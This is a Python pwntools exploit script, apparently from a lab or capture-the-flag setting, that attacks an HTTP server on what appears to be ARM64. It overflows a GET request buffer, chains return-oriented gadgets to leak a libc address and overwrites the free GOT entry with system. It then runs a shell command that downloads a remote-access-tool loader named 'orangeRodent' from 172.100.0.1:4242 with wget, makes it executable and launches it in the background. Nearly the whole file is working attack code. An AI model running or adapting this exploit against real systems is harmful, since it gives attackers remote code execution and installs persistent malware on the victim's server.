import socket
from pwn import *
import time

READ_UNTIL_ADDR = p64(0x400efc)
SEND_STATUS_ADDR = p64(0x401048)
ATOI_GOT = p64(0x402280)
CLIENT_FD = p64(4) # We are predicting we will always be client fd 4 with small chance of error
SERVER_FD = p64(3)
WRITEABLE_DATA_ADDR = p64(0x4021c0)
FREE_CALL = p64(0x400fa4) # Loads x0 from stack and x1 from x19 for write+system call via free GOT. 
                          # Write is needed to setup stack so that system actually runs correctly.
FREE_GOT = p64(0x4022d8)
CLOSE_SOCKET = p64(0x401790) # Closes client socket in main loop and loops back to accept.
PUTS_STR = p64(0x0040059d) # Chosen because it sounds like HTTP PUT method
R_ADDR = p64(0x040198c) # From "Error" string embedded in binary -> "r"
X_19 = p64(0x400e98) # Load x19 from stack; ret

def leakLibcBase(sock) -> int:
    #  Buff Overflow Vulnerablility in processing of a HTTP request
    payload = b"GET"
    payload += b"\xAA"*(1045) 
    payload += PUTS_STR # Prevent printf from segfaulting when printing method
    payload += b'A'*16
    payload += SEND_STATUS_ADDR # Leak libc atoi address via sendStatus method 
    payload += b"A" * 24
    payload += READ_UNTIL_ADDR # Write payload to a writable segment of memory by recalling readUntil
    payload += b"B"*8
    payload += p64(0x00401800) # Addr of random string to prevent segfault in snprintf
    payload += ATOI_GOT
    payload += b'A'* 4
    payload += CLIENT_FD
    payload += b"B" * 260
    payload += READ_UNTIL_ADDR # Overwrite GOT free addr with system addr by recalling readUntil
    payload += WRITEABLE_DATA_ADDR
    payload += b"ABCD"
    payload += CLIENT_FD
    payload += b"\x00"*20
    payload += X_19 # Load address of string "r\x00" from "error\x00" into x19 to prepare for call to write 
    payload += FREE_GOT
    payload += b"ABCD"
    payload += CLIENT_FD
    payload += b"\x00"*20
    payload += FREE_CALL # Call system via the overwritten free using the written shell script
    payload += R_ADDR
    payload += b"\x00"*32
    payload += READ_UNTIL_ADDR # Restore the free GOT entry to actually point to free in libc.
    payload += b"\x00"*28
    payload += CLIENT_FD[:4]
    payload += WRITEABLE_DATA_ADDR
    payload += b"\x00" * 16
    payload += CLOSE_SOCKET    # Close client socket and restore stack variables for accept()
    payload += FREE_GOT
    payload += b"ABCD"
    payload += CLIENT_FD
    payload += b"\x00"*56
    payload += p64(0x901f000200000010) # sockaddr struct for accept
    payload += b"\x00"*16
    payload += CLIENT_FD
    payload += SERVER_FD

    payload += b" /status" # sometimes returns to an address here
    payload += b" HTTP/1.1"
    payload += "\r\n".encode("ascii")*2 
    sock.send(payload)
    
    # Recv first HTTP response
    sock.recvuntil(b"error\r\n")
    sock.recvuntil(b"\r\n\r\n")

    ATOI_TO_LIBC_BASE_OFFSET = 0x3ba88
    # Recv HTTP response with atoi address
    buff = sock.recvuntil(b" status Error")
    buff = buff[:buff.rfind(b' status')]
    buff = buff + (b"\x00" * (8-(len(buff)%8)))
    addr = u64(buff)
    return addr-ATOI_TO_LIBC_BASE_OFFSET

def sendRatLoaderPayload(sock, callback_ip: str, callback_port_stdin: str, callback_port_stdout: str):
    payload = "/bin/sh -c \"wget 172.100.0.1:4242/orangeRodent 2>&1 1>/dev/null; chmod +x orangeRodent; setsid ./orangeRodent &\" #"
    # payload = 'echo Call success'
    sock.send(payload.encode('ascii')+b"D")

def overwriteFreeGot(sock, libcBase: int):
    SYSTEM_OFFSET = 0x472b4
    sys_addr = libcBase+SYSTEM_OFFSET
    sock.send(p64(sys_addr)+b"D")

def restoreFreeGot(sock, libcBase: int):
    FREE_OFFSET = 0x7f0c8
    free_addr = libcBase + FREE_OFFSET
    sock.send(p64(free_addr)+b"D")

def exploit(ip: str, port: int):
    sock = remote(ip, port)
    log.info("Attempting to leak libc base address")
    libc = leakLibcBase(sock)
    log.success(f"Leaked libc base address: {hex(libc)}")
    log.info("Writing rat loader script payload")
    sendRatLoaderPayload(sock, "172.100.0.1", "9001", "9002")
    log.info("Overwriting GOT free entry")
    overwriteFreeGot(sock, libc)
    log.info("Restoring GOT free entry")
    restoreFreeGot(sock, libc)
    feedback = sock.recvall()
    if (feedback[-1:] == b"r"):
        log.success("Received expected reply. Success likely.")
    else:
        # There is some type of race in write that will occasionally change the address stored in x1 so if we do not get the write back that is probably the issue
        log.failure("Did not receive expected reply. Try rethrowing.")
    # sock.interactive()

if __name__ == "__main__":
    exploit("172.100.0.2", 8080)
